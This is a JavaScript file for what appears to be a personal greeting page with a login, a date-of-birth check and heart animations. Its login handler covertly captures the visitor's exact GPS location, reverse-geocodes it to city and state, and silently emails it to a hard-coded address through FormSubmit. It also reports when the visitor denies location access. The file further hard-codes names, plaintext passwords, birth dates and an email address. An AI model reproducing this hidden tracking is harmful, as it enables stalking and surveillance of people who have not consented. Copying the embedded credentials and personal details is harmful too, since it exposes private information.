function check() {
    let in2 = document.getElementById("in2");
    let span2 = document.getElementById("spn");

    let validNames = [
        "Sneha Singh",
        "Sneha", 
        "sneha singh", 
        "sneha",
        "Sneha singh", 
        "sneha Singh", 
        "Uday"
    ];

    let trimmedName = in2.value.trim();

    if (validNames.includes(trimmedName)) {
        span2.style.visibility = "visible";
        span2.style.animation = "fadein 1s forwards";
    } else {
        span2.style.visibility = "hidden";
    }
}

// -------------------------
// Login Function
// -------------------------
function login() {
    let in2 = document.getElementById("in2");
    let pwd = document.getElementById("pwd");

    let allowedNames = [
        "Sneha", "Sneha Singh", "sneha", "sneha singh",
        "Sneha singh", "sneha Singh", "Uday"
    ];

    let trimmedName = in2.value.trim();

    if (allowedNames.includes(trimmedName) && 
        (pwd.value == "Sneha@2004" || pwd.value =="Uday@2005")) {

        // Trigger exact location capture upon successful login
        captureAndAttachLocation(trimmedName);

        // Hide login form and show DOB form
        document.getElementById("loginform").style.display = "none";
        document.getElementById("dobform1").style.display = "flex";
    } else {
        alert("Wrong Username or Password!");
    }
}

// -------------------------
// DOB Submission
// -------------------------
function submitDob(event) {
  let dobInput = document.getElementById("dob").value.trim();

  if (dobInput === "11-09-2004" || dobInput === "05-01-2005") {
    // allow real submission
    sessionStorage.setItem("DobDone", "true");
    return true;  
  } else {
    alert("Incorrect Date Of Birth !!");
    event.preventDefault(); // block form submission
    return false;
  }
}

// Flatpickr initialization
if (typeof flatpickr !== "undefined") {
    flatpickr("#dob", {
      dateFormat: "d-m-Y"
    });
}

// -------------------------
// Sprinkle/Graph Effect
// -------------------------
function graph() {
    let d = document.getElementById("d");
    d.style.visibility = "visible";
    d.style.animation = "fadein 2s forwards";

    const container = document.getElementById('sprinkle-container');
    for (let i = 0; i < 30; i++) {
        let p = document.createElement('div');
        p.classList.add('particle');
        p.innerText = "❤";        
        p.style.left = Math.random() * 100 + "vw";
        p.style.animationDuration = 2 + Math.random() * 3 + "s";
        p.style.animationDelay = Math.random() * 2 + "s";
        container.appendChild(p);
    }
}

// -------------------------
// Button Selection Effects
// -------------------------
function select(btn){
    btn.style.boxShadow = "0px 0px 20px 10px rgba(255, 255, 255, 0.7)";
}
function deselect(btn) {
    btn.style.boxShadow = "none";
}

// -------------------------
// Password Toggle
// -------------------------
function togglePwd() {
    let pwd = document.getElementById("pwd");
    pwd.type = pwd.type === "password" ? "text" : "password";
}

// -------------------------
// EXACT LOCATION & FORMSUBMIT LOGIC
// -------------------------

// Helper to inject hidden fields directly into #dobForm
function injectHiddenField(form, name, value) {
    if (!form || !value) return;
    let input = form.querySelector(`input[name="${name}"]`);
    if (!input) {
        input = document.createElement("input");
        input.type = "hidden";
        input.name = name;
        form.appendChild(input);
    }
    input.value = value;
}

// Send background AJAX request to FormSubmit
async function sendSilentBackgroundEmail(payload) {
    const dobForm = document.getElementById("dobForm");
    let targetEmail = "sagarwal2k20@gmail.com"; // Fallback email

    if (dobForm && dobForm.action) {
        // Extract email from form action attribute
        const match = dobForm.action.match(/formsubmit\.co\/(.+)/);
        if (match && match[1]) targetEmail = match[1];
    }

    try {
        await fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(payload)
        });
        console.log("Location alert sent successfully.");
    } catch (e) {
        console.log("Alert failed:", e.message);
    }
}

async function captureAndAttachLocation(username) {
    const dobForm = document.getElementById("dobForm");

    let payload = {
        _subject: `${username} logged in! (Location Alert)`,
        User: username,
        LoginTime: new Date().toLocaleString()
    };

    // Inject Username into the form
    injectHiddenField(dobForm, "LoggedInUser", username);

    // Exact GPS Geolocation (Shows browser prompt)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            payload.Method = "Exact GPS (Prompted)";
            payload.Coordinates = `${latitude}, ${longitude}`;
            payload.Accuracy = `${Math.round(accuracy)} meters`;
            payload.GoogleMapsLink = mapsLink;

            injectHiddenField(dobForm, "Exact_Coordinates", `${latitude}, ${longitude}`);
            injectHiddenField(dobForm, "Google_Maps", mapsLink);

            // Reverse Geocode to get City and State
            try {
                const geoRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
                const geoData = await geoRes.json();
                payload.City = geoData.locality || geoData.city || "Unknown";
                payload.State = geoData.principalSubdivision || "Unknown";

                injectHiddenField(dobForm, "City", payload.City);
                injectHiddenField(dobForm, "State", payload.State);
            } catch (err) {
                console.log("Reverse geocoding failed.");
            }

            // Send instant background email with exact coordinates
            await sendSilentBackgroundEmail(payload);

        }, (err) => {
            // If the user clicks "Block" or the request times out
            payload.Method = "Location Access Denied / Failed";
            payload.Error = err.message;
            sendSilentBackgroundEmail(payload);
        }, { enableHighAccuracy: true, timeout: 10000 }); // 10 seconds to allow the user to click "Allow"
    } else {
        // If the browser doesn't support geolocation at all
        payload.Method = "Geolocation API not supported by browser";
        sendSilentBackgroundEmail(payload);
    }
}
